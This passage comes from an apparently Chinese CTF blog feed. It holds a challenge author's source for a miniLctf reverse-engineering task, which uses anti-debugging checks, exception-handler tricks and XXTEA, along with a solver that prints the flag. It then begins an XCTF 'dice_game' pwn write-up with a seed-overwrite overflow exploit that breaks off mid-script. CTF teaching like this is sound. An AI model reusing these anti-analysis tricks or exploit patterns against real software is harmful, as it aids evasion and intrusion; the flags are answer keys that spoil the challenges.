class="line">&#123;</span><br><span class="line">buffer[i] ^= <span class="number">0x55</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nouse</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD a = (DWORD)&amp;tls;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="进程2"><a href="#进程2" class="headerlink" title="进程2"></a>进程2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是最终在PE文件资源段存着的那个程序源码</span></span><br><span class="line"><span class="comment">//flag为 miniLctf&#123;cbda59ff59e3e90c91c02e9b40b78b&#125;len = 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(__stdcall* pNtQueryInformationProcess)</span><span class="params">(<span class="comment">//用于反调试</span></span></span></span><br><span class="line"><span class="params"><span class="function">IN HANDLE           ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PVOID           ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">IN ULONG            ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PULONG          ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;<span class="comment">//VEH函数指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明区</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">VectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span>;<span class="comment">//自定义的VEH处理函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">checkdebug1</span><span class="params">()</span></span>;<span class="comment">//监测调试1，因为进程1通过在CreateProcess启动进程2的时候用了DEBUG_PROCESS，所以进程2 IsDebuggerPresent()返回的是1</span></span><br><span class="line"><span class="function">BOOL <span class="title">checkdebug2</span><span class="params">()</span></span>;<span class="comment">//监测调试器,ida.exe olldbg.exe等</span></span><br><span class="line"><span class="function">DWORD <span class="title">update_delta</span><span class="params">(<span class="keyword">int</span> parm)</span></span>;<span class="comment">//更新delta</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_enc</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span></span>;<span class="comment">//XXTEA加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">char</span>* input)</span></span>;<span class="comment">//从共享内存中读入FLAG</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initwork</span><span class="params">()</span></span>;<span class="comment">//初始化工作，反调试及注册VEH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量区</span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">44</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD DELTA = <span class="number">0x9E3779B9</span>;<span class="comment">// 真正的是 ((0x9E3779B9 ^ 0x12345678 ^ 0x90909090 ^ 123) + 12345) ^111111 -&gt; 0x1c925d64</span></span><br><span class="line">DWORD xxteaKey[] = &#123; <span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x78</span> &#125;; <span class="comment">// 真正的是 &#123;0x12,0x90,0x56,0x78&#125;;</span></span><br><span class="line">FnAddVectoredExceptionHandler MyAddVectoredExceptionHandler;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag的前半段加密后的密文</span></span><br><span class="line"><span class="keyword">char</span> enc_flag1[<span class="number">20</span>] = &#123; <span class="number">0x28</span>, <span class="number">0xe3</span>, <span class="number">0x7c</span>, <span class="number">0x6b</span>, <span class="number">0xdd</span>, <span class="number">0xd5</span>, <span class="number">0x41</span>, <span class="number">0x48</span>, <span class="number">0xdc</span>, <span class="number">0x84</span>, <span class="number">0x37</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0x8a</span>, <span class="number">0xef</span>, <span class="number">0x26</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x07</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">initwork</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">checkdebug1</span>()) &#123;</span><br><span class="line">DELTA ^= <span class="number">0x90909090</span>;</span><br><span class="line">xxteaKey[<span class="number">1</span>] = <span class="number">0x90</span>;<span class="comment">//如果正在调试</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DELTA = <span class="built_in">update_delta</span>(DELTA);</span><br><span class="line"><span class="comment">/*printf(&quot;p2: DELTA = %#X\n&quot;, DELTA);</span></span><br><span class="line"><span class="comment">printf(&quot;p2: KEY = %#X, %#X, %#X, %#X\n&quot;, xxteaKey[0], xxteaKey[1], xxteaKey[2], xxteaKey[3]);*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getflag</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="built_in">xxtea_enc</span>((DWORD*)flag, <span class="number">5</span>, xxteaKey);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(flag, enc_flag1, <span class="number">20</span>))<span class="comment">//如果flag的第一部分（前20个字节）是假的</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*printf(&quot;p2: The first half of flag is incorrect!\n&quot;);</span></span><br><span class="line"><span class="comment">printf(&quot;p2: wrong\n&quot;);*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;p2: The first half of flag is correct!\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">VectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xC0000005</span>) <span class="comment">//非法内存访问</span></span><br><span class="line">&#123;</span><br><span class="line">pExcepInfo-&gt;ContextRecord-&gt;Eip = pExcepInfo-&gt;ContextRecord-&gt;Eip + <span class="number">2</span>;<span class="comment">//产生异常的代码2字节</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">checkdebug1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">IsDebuggerPresent</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">checkdebug2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD ret = <span class="number">0</span>;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pe32);</span><br><span class="line">HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bMore = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line"><span class="keyword">while</span> (bMore)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (_stricmp(pe32.szExeFile, <span class="string">&quot;OllyDbg.exe&quot;</span>) == <span class="number">0</span> || _stricmp(pe32.szExeFile, <span class="string">&quot;ida.exe&quot;</span>) == <span class="number">0</span> || _stricmp(pe32.szExeFile, <span class="string">&quot;x32dbg.exe&quot;</span>) == <span class="number">0</span> || _stricmp(pe32.szExeFile, <span class="string">&quot;windbg.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">bMore = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">update_delta</span><span class="params">(<span class="keyword">int</span> parm)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = (parm ^ <span class="number">123</span>) + <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line">call label;</span><br><span class="line">label:</span><br><span class="line">add dword ptr[esp], <span class="number">5</span>;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">mov eax, a;</span><br><span class="line"><span class="keyword">xor</span> ebx, ebx;</span><br><span class="line">mov[ebx], ebx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_enc</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD y, z, sum;</span><br><span class="line"><span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">char</span>* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFileMap = <span class="built_in">CreateFileMapping</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0x1000</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;FLAG&quot;</span>));</span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span>*)<span class="built_in">MapViewOfFile</span>(hFileMap, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0X1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(flag, p, <span class="number">40</span>);</span><br><span class="line"><span class="comment">//printf(&quot;p2: get content: %s\n&quot;, p);</span></span><br><span class="line"><span class="built_in">UnmapViewOfFile</span>(p);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFileMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initwork</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">checkdebug2</span>()) &#123;</span><br><span class="line">DELTA ^= <span class="number">0x12345678</span>;<span class="comment">//如果没有ida调试</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;p2: 检测到调试器软件!, 请退出后重新运行程序\n&quot;);</span></span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;Kernel32.dll&quot;</span>);</span><br><span class="line">MyAddVectoredExceptionHandler = (FnAddVectoredExceptionHandler)::<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;AddVectoredExceptionHandler&quot;</span>);</span><br><span class="line"><span class="built_in">MyAddVectoredExceptionHandler</span>(<span class="number">0</span>, (_EXCEPTION_POINTERS*)&amp;VectExcepHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先build进程2，然后进程2的PE文件每一个字节都异或0X55后，存入到进程1的项目文件中的资源中，build进程1，然后build进程1后的PE文件，修改节表，将.rsrc添加可写属性，然后将数据目录表中TLS项对应的修改下即可</p><img src="/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/image-20220421160020616.png" class="" title="image-20220421160020616"><img src="/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/image-20220421160048174.png" class="" title="image-20220421160048174"><img src="/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/image-20220421162502568.png" class="" title="image-20220421162502568"><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX1 (((z&gt;&gt;6^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX2 (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_dec1</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>], DWORD delta)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD y, z, sum;</span><br><span class="line"><span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line"></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * delta;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX1;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX1;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_dec2</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>], DWORD delta)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD y, z, sum;</span><br><span class="line"><span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line"></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * delta;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX2;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX2;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc_flag1[<span class="number">20</span>] = &#123; <span class="number">0x28</span>, <span class="number">0xe3</span>, <span class="number">0x7c</span>, <span class="number">0x6b</span>, <span class="number">0xdd</span>, <span class="number">0xd5</span>, <span class="number">0x41</span>, <span class="number">0x48</span>, <span class="number">0xdc</span>, <span class="number">0x84</span>, <span class="number">0x37</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0x8a</span>, <span class="number">0xef</span>, <span class="number">0x26</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x07</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> enc_flag2[<span class="number">20</span>] = &#123; <span class="number">0x21</span>, <span class="number">0xa9</span>, <span class="number">0x21</span>, <span class="number">0x90</span>, <span class="number">0x60</span>, <span class="number">0x30</span>, <span class="number">0x3b</span>, <span class="number">0xf5</span>, <span class="number">0x4e</span>, <span class="number">0xa8</span>, <span class="number">0x88</span>, <span class="number">0x8e</span>, <span class="number">0xd5</span>, <span class="number">0x5a</span>, <span class="number">0x63</span>, <span class="number">0x43</span>, <span class="number">0x39</span>, <span class="number">0x92</span>, <span class="number">0x11</span>, <span class="number">0xac</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD delta = <span class="number">0x1c925d64</span>;  <span class="comment">//((0x9E3779B9 ^ 0x12345678 ^ 0x90909090 ^ 123) + 12345) ^111111</span></span><br><span class="line">DWORD xxteaKey[] = &#123; <span class="number">0x12</span>,<span class="number">0x90</span>,<span class="number">0x56</span>,<span class="number">0x78</span> &#125;; </span><br><span class="line"></span><br><span class="line"><span class="built_in">xxtea_dec1</span>((DWORD*)enc_flag1, <span class="number">5</span>, xxteaKey, delta);</span><br><span class="line">delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">xxteaKey[<span class="number">1</span>] = <span class="number">0x34</span>;</span><br><span class="line"><span class="built_in">xxtea_dec2</span>((DWORD*)enc_flag2, <span class="number">5</span>, xxteaKey, delta);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc_flag1[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc_flag2[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//miniLctf&#123;cbda59ff59e3e90c91c02e9b40b78b&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF出题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN刷题1</title>
      <link href="/2022/04/01/pwn%E5%88%B7%E9%A2%981/"/>
      <url>/2022/04/01/pwn%E5%88%B7%E9%A2%981/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界PWN刷题1"><a href="#攻防世界PWN刷题1" class="headerlink" title="攻防世界PWN刷题1"></a>攻防世界PWN刷题1</h1><h2 id="1-dice-game"><a href="#1-dice-game" class="headerlink" title="1. dice_game"></a>1. dice_game</h2><p>XCTF 4th-QCTF-2018</p><p>IDA打开程序分析，发现是一个随机数的小游戏</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220330220039223.png" class="" title="image-20220330220039223"><p>在这个地方存在溢出，可以把seed给覆盖掉，把seed覆盖为0，然后自己写个程序看随机数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; <span class="number">50</span>; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写EXP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&quot;dice_game&quot;)</span></span><br><span class="line">io = remote(<span 